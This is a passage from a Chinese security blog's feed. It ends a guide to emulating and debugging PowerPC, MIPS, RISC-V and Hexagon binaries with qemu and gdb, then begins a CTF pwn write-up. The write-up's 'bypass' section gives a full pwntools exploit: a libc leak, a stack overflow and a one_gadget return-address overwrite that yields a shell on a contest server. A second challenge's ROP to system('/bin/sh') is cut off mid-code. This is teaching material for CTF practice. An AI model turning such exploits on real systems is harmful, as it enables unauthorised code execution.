function">apt</span> <span class="token function">install</span> gcc-powerpc-linux-gnu binutils-powerpc-linux-gnu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装动态链接库</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">apt</span> search <span class="token string">"libc6-"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"powerpc"</span>$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libc6-powerpc-cross<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="运行-2"><a href="#运行-2" class="headerlink" title="运行"></a>运行</h3><p>运行<code>powerpc</code> <strong>64 位是 ppc64，64位小端序是 qemu-ppc64le</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$qemu</span>-ppc <span class="token parameter variable">-L</span> /usr/powerpc-linux-gnu ./hello<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$qemu</span>-ppc-static ./pwn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'powerpc'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span> endian <span class="token operator">=</span> <span class="token string">'big'</span><span class="token punctuation">)</span>process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-ppc"</span><span class="token punctuation">,</span><span class="token string">"-g"</span><span class="token punctuation">,</span><span class="token string">"1234"</span><span class="token punctuation">,</span><span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/usr/powerpc-linux-gnu"</span><span class="token punctuation">,</span> file_name<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="调试-2"><a href="#调试-2" class="headerlink" title="调试"></a>调试</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ gdb-multiarch <span class="token parameter variable">-q</span> <span class="token parameter variable">-ex</span> <span class="token string">"set architecture powerpc:common"</span> ./filename<span class="token builtin class-name">set</span> endian big / littletarget remote :1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>编译<code>powerpc</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$powerpc</span>-linux-gnu-gcc ./test.c <span class="token parameter variable">-o</span> hello<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="mips"><a href="#mips" class="headerlink" title="mips"></a>mips</h2><h3 id="环境安装-1"><a href="#环境安装-1" class="headerlink" title="环境安装"></a>环境安装</h3><p>mips 和 mips64 大端序：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> gcc-mips-linux-gnu g++-mips-linux-gnu libc6-dbg-mips-cross<span class="token variable">$sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> gcc-mips64-linux-gnuabi64 g++-mips64-linux-gnuabi64 libc6-dbg-mips64-cross<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>小端序：<strong>qemu-mipsel</strong> &#x2F; qemu-mips64el</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libc6-mipsel-cross<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="运行-3"><a href="#运行-3" class="headerlink" title="运行"></a>运行</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qemu-mipsel <span class="token parameter variable">-L</span> /usr/mipsel-linux-gnu ./SuperCgi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'mips'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-mipsel"</span><span class="token punctuation">,</span><span class="token string">"-g"</span><span class="token punctuation">,</span><span class="token string">"1234"</span><span class="token punctuation">,</span> file_name<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="调试-3"><a href="#调试-3" class="headerlink" title="调试"></a>调试</h3><pre class="line-numbers language-none"><code class="language-none">gdb-multiarch -q .&#x2F;pwnset architecture mipsset endian littletarget remote localhost:1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="编译-1"><a href="#编译-1" class="headerlink" title="编译"></a>编译</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mipsel-linux-gnu-gcc test.c <span class="token parameter variable">-o</span> <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="riscv"><a href="#riscv" class="headerlink" title="riscv"></a>riscv</h2><h3 id="riscv64环境配置"><a href="#riscv64环境配置" class="headerlink" title="riscv64环境配置"></a>riscv64环境配置</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> gcc-riscv64-linux-gnu g++-riscv64-linux-gnu libc6-dbg-riscv64-cross<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> libc6-riscv64-cross binutils-riscv64-linux-gnu gcc-riscv64-linux-gnu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="运行-4"><a href="#运行-4" class="headerlink" title="运行"></a>运行</h3><p>在22的机器上</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$qemu</span>-riscv64 <span class="token parameter variable">-L</span> /usr/riscv64-linux-gnu pwn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'riscv'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-riscv64"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/usr/riscv64-linux-gnu"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span><span class="token string">"1234"</span><span class="token punctuation">,</span> file_name<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="调试-4"><a href="#调试-4" class="headerlink" title="调试"></a>调试</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb-multiarch <span class="token parameter variable">-q</span> ./pwn<span class="token builtin class-name">set</span> architecture riscv<span class="token builtin class-name">set</span> endian littletarget remote localhost:1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="hexagon"><a href="#hexagon" class="headerlink" title="hexagon"></a>hexagon</h2><h3 id="运行-5"><a href="#运行-5" class="headerlink" title="运行"></a>运行</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$qemu</span>-hexagon ./chall<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="调试-5"><a href="#调试-5" class="headerlink" title="调试"></a>调试</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'qemu-hexagon'</span><span class="token punctuation">,</span> <span class="token string">'-L'</span><span class="token punctuation">,</span> <span class="token string">'libc'</span><span class="token punctuation">,</span> <span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token string">'in_asm,exec,cpu,nochain'</span><span class="token punctuation">,</span> <span class="token string">'-singlestep'</span><span class="token punctuation">,</span>            <span class="token string">'-dfilter'</span><span class="token punctuation">,</span> <span class="token string">'0x20400+0xc0'</span><span class="token punctuation">,</span> <span class="token string">'-strace'</span><span class="token punctuation">,</span> <span class="token string">'-D'</span><span class="token punctuation">,</span> <span class="token string">'./log'</span><span class="token punctuation">,</span> <span class="token string">'./chall'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><p>下载 hexagon.dll 插件使用 8.3 的 ida.exe 打开 32 位的 QUALCOMM DSP6 程序</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;qemu安装&quot;&gt;&lt;a href=&quot;#qemu安装&quot; class=&quot;headerlink&quot; title=&quot;qemu安装&quot;&gt;&lt;/a&gt;qemu安装&lt;/h2&gt;&lt;p&gt;安装&lt;code&gt;qemu qemu-user qemu-user-static&lt;/code&gt;&lt;/p&gt;
&lt;pr</summary>
      
    
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="异构" scheme="https://starrysky1004.github.io/tags/%E5%BC%82%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>2025春秋杯冬季赛pwn方向题解</title>
    <link href="https://starrysky1004.github.io/2025/01/23/2025-chun-qiu-bei-dong-ji-sai-pwn-fang-xiang-ti-jie/2025-chun-qiu-bei-dong-ji-sai-pwn-fang-xiang-ti-jie/"/>
    <id>https://starrysky1004.github.io/2025/01/23/2025-chun-qiu-bei-dong-ji-sai-pwn-fang-xiang-ti-jie/2025-chun-qiu-bei-dong-ji-sai-pwn-fang-xiang-ti-jie/</id>
    <published>2025-01-23T09:31:39.000Z</published>
    <updated>2025-01-23T10:04:20.005Z</updated>
    
    <content type="html"><![CDATA[<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>main 函数中输入格式不正确的时候会输出 puts 函数地址，泄露 libc 地址，输入长度为 4 内容为 \x00 的时候会进入 compare 函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token operator">&amp;</span>puts<span class="token punctuation">;</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>__int64 <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>init_0<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v6<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">".BYPASS"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> fd <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> buf<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\n'</span> <span class="token punctuation">)</span>        buf<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      v8 <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token char">':'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token punctuation">(</span>v8 <span class="token operator">-</span> buf<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0x3F</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v8 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0x3F</span> <span class="token punctuation">)</span>          <span class="token punctuation">&#123;</span>            <span class="token operator">*</span>v8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>byte_602140<span class="token punctuation">,</span> v8 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>              <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>              <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span>                  <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token punctuation">)</span>                  <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token function">compare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>              <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>漏洞点在 compare 函数中，两次 read 都是向 buf 读取并且长度都是 0x200，第一次读取会复制到 KEY 中，第二次读取会复制到 VAL 中，而离 rbp 最近的 VAL 距离也超过 0x200，但是从 buf 复制的过程是遇 \x00 停止，所以可以从 buf 一直复制到 KEY，加起来就超过 0x200 了，但是在覆盖到 ret 的过程中还需要注意 rbp-2h 是复制的 index，要合理控制这个 i 让复制过程正确进行</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">ssize_t</span> v0<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-610h] BYREF</span>  <span class="token keyword">char</span> KEY<span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+200h] [rbp-410h] BYREF</span>  <span class="token keyword">char</span> VAL<span class="token punctuation">[</span><span class="token number">526</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+400h] [rbp-210h] BYREF</span>  __int16 i<span class="token punctuation">;</span> <span class="token comment">// [rsp+60Eh] [rbp-2h]</span>  <span class="token function">memset</span><span class="token punctuation">(</span>VAL<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x200uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>KEY<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>KEY<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">LODWORD</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"KEY: "</span><span class="token punctuation">,</span> <span class="token number">5uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>v0 <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>        KEY<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      KEY<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v0 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token function">LODWORD</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"VAL: "</span><span class="token punctuation">,</span> <span class="token number">5uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>v0 <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>            VAL<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> v0<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'39.106.48.123'</span><span class="token punctuation">,</span> <span class="token number">44314</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'abcd'</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> get_libc<span class="token punctuation">(</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc/libc-2.27.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\x00\x00\x00\x00'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'KEY: '</span> <span class="token operator">+</span> <span class="token string">b'c'</span> <span class="token operator">*</span> <span class="token number">19</span> <span class="token operator">+</span> <span class="token string">b'\x13\x02'</span> <span class="token operator">+</span> <span class="token string">b'aaaaaaaa'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4f302</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'VAL: '</span> <span class="token operator">+</span> <span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x200</span> <span class="token operator">-</span> <span class="token number">0x5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="gender-simulation"><a href="#gender-simulation" class="headerlink" title="gender_simulation"></a>gender_simulation</h2><p>菜单里就给了 libc 地址，这题直接测试发现在输入 2 2 之后再输入可以直接劫持程序流，有个后门是性别为购物袋，存在栈溢出漏洞，直接溢出写 rop 链执行 system(‘&#x2F;bin&#x2F;sh’)</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">gender</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v0<span class="token punctuation">;</span> <span class="token comment">// rax</span>  _BYTE buf<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span>  v0 <span class="token operator">=</span> std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span>         <span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span>         <span class="token string">"If you think you are a shopping bag, please leave your gender certificate"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>ostream<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>std<span class="token 